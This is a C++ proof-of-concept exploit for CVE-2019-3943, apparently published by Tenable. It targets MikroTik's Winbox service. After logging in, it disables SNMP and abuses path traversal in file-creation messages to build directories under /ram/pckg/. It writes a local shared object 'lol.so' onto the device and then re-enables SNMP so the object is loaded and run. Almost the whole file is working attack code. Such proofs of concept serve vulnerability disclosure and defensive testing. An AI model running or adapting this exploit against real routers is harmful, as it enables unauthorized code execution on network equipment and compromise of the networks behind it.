/*
    Copyright 2019 Tenable, Inc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                *

    Redistribution and use in source and binary forms, with or without modification,
    are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice, this
        list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
        this list of conditions and the following disclaimer in the documentation
        and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
        may be used to endorse or promote products derived from this software
        without specific prior written permission.

    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
    POSSIBILITY OF SUCH DAMAGE.
*/
#include <fstream>
#include <cstdlib>
#include <iostream>
#include <boost/cstdint.hpp>
#include <boost/program_options.hpp>
#include <boost/algorithm/string.hpp>

#include "winbox_session.hpp"
#include "winbox_message.hpp"

namespace
{
    const char s_version[] = "CVE-2019-3943 PoC Using SNMP dlopen";

    bool parseCommandLine(int p_argCount, const char* p_argArray[],
                          std::string& p_username, std::string& p_password,
                          std::string& p_ip, std::string& p_port)
    {
        boost::program_options::options_description description("options");
        description.add_options()
        ("help,h", "A list of command line options")
        ("version,v", "Display version information")
        ("username,u", boost::program_options::value<std::string>(), "The user to log in as")
        ("password", boost::program_options::value<std::string>(), "The password to log in with")
        ("port,p", boost::program_options::value<std::string>()->default_value("8291"), "The Winbox port to connect to")
        ("ip,i", boost::program_options::value<std::string>(), "The IPv4 address to connect to");

        boost::program_options::variables_map argv_map;
        try
        {
            boost::program_options::store(
                boost::program_options::parse_command_line(
                    p_argCount, p_argArray, description), argv_map);
        }
        catch (const std::exception& e)
        {
            std::cerr << e.what() << "\n" << std::endl;
            std::cerr << description << std::endl;
            return false;
        }

        boost::program_options::notify(argv_map);
        if (argv_map.empty() || argv_map.count("help"))
        {
            std::cerr << description << std::endl;
            return false;
        }

        if (argv_map.count("version"))
        {
            std::cerr << "Version: " << ::s_version << std::endl;
            return false;
        }

        if (argv_map.count("username") && argv_map.count("ip") &
            argv_map.count("port"))
        {
            p_username.assign(argv_map["username"].as<std::string>());
            p_ip.assign(argv_map["ip"].as<std::string>());
            p_port.assign(argv_map["port"].as<std::string>());

            if (argv_map.count("password"))
            {
                p_password.assign(argv_map["password"].as<std::string>());
            }
            else
            {
                p_password.assign("");
            }
            return true;
        }
        else
        {
            std::cerr << description << std::endl;
        }

        return false;
    }
}

int main(int p_argc, const char** p_argv)
{
    std::string username;
    std::string password;
    std::string ip;
    std::string port;
    if (!parseCommandLine(p_argc, p_argv, username, password, ip, port))
    {
        return EXIT_FAILURE;
    }

    std::ifstream snmp_obj("../shared_obj/lol_i386.so", std::ifstream::in | std::ifstream::binary);
    if (!snmp_obj.is_open() || !snmp_obj.good())
    {
        std::cerr << "Failed to open the obj file " << std::endl;
        return EXIT_FAILURE;
    }

    std::string obj_data((std::istreambuf_iterator<char>(snmp_obj)), std::istreambuf_iterator<char>());
    snmp_obj.close();

    {
        Winbox_Session winboxSession(ip, port);
        if (!winboxSession.connect())
        {
            std::cerr << "Failed to connect to the remote host" << std::endl;
            return EXIT_FAILURE;
        }

        boost::uint32_t p_session_id = 0;
        if (!winboxSession.login(username, password, p_session_id))
        {
            std::cerr << "[-] Login failed." << std::endl;
            return false;
        }

        // request the current SNMP settings
        WinboxMessage msg;
        msg.set_to(34);
        msg.set_command(0xfe000d);
        msg.set_reply_expected(true);
        msg.set_request_id(81);
        msg.add_u32(0xfe000c, 5);
        if (!winboxSession.send(msg))
        {
            std::cerr << "Error sending SNMP request" << std::endl;
            return EXIT_FAILURE;
        }

        // recv the response to our get requests
        msg.reset();
        if (!winboxSession.receive(msg))
        {
            std::cerr << "Error receiving a response." << std::endl;
            return EXIT_FAILURE;
        }
        if (msg.has_error())
        {
            std::cerr << "Error: " << msg.get_error_string() << std::endl;
            return EXIT_FAILURE;
        }

        if (msg.get_boolean(1) == true)
        {
            std::cout << "[+] SNMP is enabled. Disabling it." << std::endl;

            // disable SNMP
            msg.reset();
            msg.set_to(34);
            msg.set_command(0xfe000e);
            msg.set_reply_expected(true);
            msg.set_request_id(82);
            msg.add_boolean(1, false);
            if (!winboxSession.send(msg))
            {
                std::cerr << "Error sending." << std::endl;
                return EXIT_FAILURE;
            }
            
            // as long as we don't error out its fine.
            msg.reset();
            if (!winboxSession.receive(msg))
            {
                std::cerr << "Error receiving a response." << std::endl;
                return EXIT_FAILURE;
            }
            if (msg.has_error())
            {
                std::cerr << "Error: " << msg.get_error_string() << std::endl;
                return EXIT_FAILURE;
            }
        }

        std::cout << "[+] SNMP is disabled" << std::endl;
        std::cout << "[+] Trying to create /ram/pckg/snmp_xploit/nova/lib/snmp/" << std::endl;
        msg.reset();
        msg.set_to(72,1);
        msg.set_command(6);
        msg.add_string(1, "//./.././.././../ram/pckg/snmp_xploit");
        msg.set_request_id(1);
        msg.set_reply_expected(true);
        if (!winboxSession.send(msg))
        {
            std::cerr << "Failed to send a message." << std::endl;
            return EXIT_FAILURE;
        }
        
        msg.reset();
        if (!winboxSession.receive(msg))
        {
            std::cerr << "Error receiving a response." << std::endl;
            return EXIT_FAILURE;
        }        
        if (msg.has_error())
        {
            std::cerr << msg.get_error_string() << std::endl;
            return EXIT_FAILURE;
        }

        msg.reset();
        msg.set_to(72,1);
        msg.set_command(6);
        msg.add_string(1, "//./.././.././../ram/pckg/snmp_xploit/nova");
        msg.set_request_id(2);
        msg.set_reply_expected(true);
        if (!winboxSession.send(msg))
        {
            std::cerr << "Failed to send a message." << std::endl;
            return EXIT_FAILURE;
        }

        msg.reset();
        if (!winboxSession.receive(msg))
        {
            std::cerr << "Error receiving a response." << std::endl;
            return EXIT_FAILURE;
        }        
        if (msg.has_error())
        {
            std::cerr << msg.get_error_string() << std::endl;
            return EXIT_FAILURE;
        }
        
        msg.reset();
        msg.set_to(72,1);
        msg.set_command(6);
        msg.add_string(1, "//./.././.././../ram/pckg/snmp_xploit/nova/lib/");
        msg.set_request_id(3);
        msg.set_reply_expected(true);
        if (!winboxSession.send(msg))
        {
            std::cerr << "Failed to send a message." << std::endl;
            return EXIT_FAILURE;
        }

        msg.reset();
        if (!winboxSession.receive(msg))
        {
            std::cerr << "Error receiving a response." << std::endl;
            return EXIT_FAILURE;
        }  
        if (msg.has_error())
        {
            std::cerr << msg.get_error_string() << std::endl;
            return EXIT_FAILURE;
        }
        
        msg.reset();
        msg.set_to(72,1);
        msg.set_command(6);
        msg.add_string(1, "//./.././.././../ram/pckg/snmp_xploit/nova/lib/snmp/");
        msg.set_request_id(4);
        msg.set_reply_expected(true);
        if (!winboxSession.send(msg))
        {
            std::cerr << "Failed to send a message." << std::endl;
            return EXIT_FAILURE;
        }

        msg.reset();
        if (!winboxSession.receive(msg))
        {
            std::cerr << "Error receiving a response." << std::endl;
            return EXIT_FAILURE;
        }   
        if (msg.has_error())
        {
            std::cerr << msg.get_error_string() << std::endl;
            return EXIT_FAILURE;
        }

        std::cout << "[+] Dropping lol.so to disk." << std::endl;        
        msg.reset();
        msg.set_to(72,1);
        msg.set_command(1);
        msg.add_string(1, "//./.././.././../ram/pckg/snmp_xploit/nova/lib/snmp/lol.so");
        msg.set_request_id(5);
        msg.set_reply_expected(true);
        if (!winboxSession.send(msg))
        {
            std::cerr << "Failed to send a message." << std::endl;
            return EXIT_FAILURE;
        }

        msg.reset();
        if (!winboxSession.receive(msg))
        {
            std::cerr << "Error receiving a response." << std::endl;
            return EXIT_FAILURE;
        }
        if (msg.has_error())
        {
            std::cerr << msg.get_error_string() << std::endl;
            return EXIT_FAILURE;
        }
        
        p_session_id = msg.get_u32(0xfe0001);
        
        msg.reset();
        msg.set_to(72,1);
        msg.set_command(2);
        msg.set_request_id(6);
        msg.add_u32(0xfe0001, p_session_id);
        msg.add_raw(5, obj_data);
        msg.set_reply_expected(true);
        if (!winboxSession.send(msg))
        {
            std::cerr << "Failed to send a message." << std::endl;
            return EXIT_FAILURE;
        }

        msg.reset();
        if (!winboxSession.receive(msg))
        {
            std::cerr << "hello!" << std::endl;
            return EXIT_FAILURE;
        }   
        if (msg.has_error())
        {
            std::cerr << msg.get_error_string() << std::endl;
            return EXIT_FAILURE;
        }
    }


    std::cout << "[+] Waiting 60 seconds for the file to actually sync" << std::endl;
    sleep(60);

    {
        std::cout << "[+] Starting SNMP" << std::endl;
        Winbox_Session winboxSession(ip, port);
        if (!winboxSession.connect())
        {
            std::cerr << "Failed to connect to the remote host" << std::endl;
            return EXIT_FAILURE;
        }

        boost::uint32_t p_session_id = 0;
        if (!winboxSession.login(username, password, p_session_id))
        {
            std::cerr << "[-] Login failed." << std::endl;
            return false;
        }

        // enable SNMP and trigger our payload
        WinboxMessage msg;
        msg.set_to(34);
        msg.set_command(0xfe000e);
        msg.set_reply_expected(true);
        msg.set_request_id(7);
        msg.add_boolean(1, true);
        if (!winboxSession.send(msg))
        {
            std::cerr << "Error sending." << std::endl;
            return EXIT_FAILURE;
        }

        // as long as we don't error out its fine.
        msg.reset();
        if (!winboxSession.receive(msg))
        {
            std::cerr << "Error receiving a response." << std::endl;
            return EXIT_FAILURE;
        }
        if (msg.has_error())
        {
            std::cerr << "Error: " << msg.get_error_string() << std::endl;
            return EXIT_FAILURE;
        }
    }

    std::cout << "[+] Done!" << std::endl;
    return EXIT_SUCCESS;
}
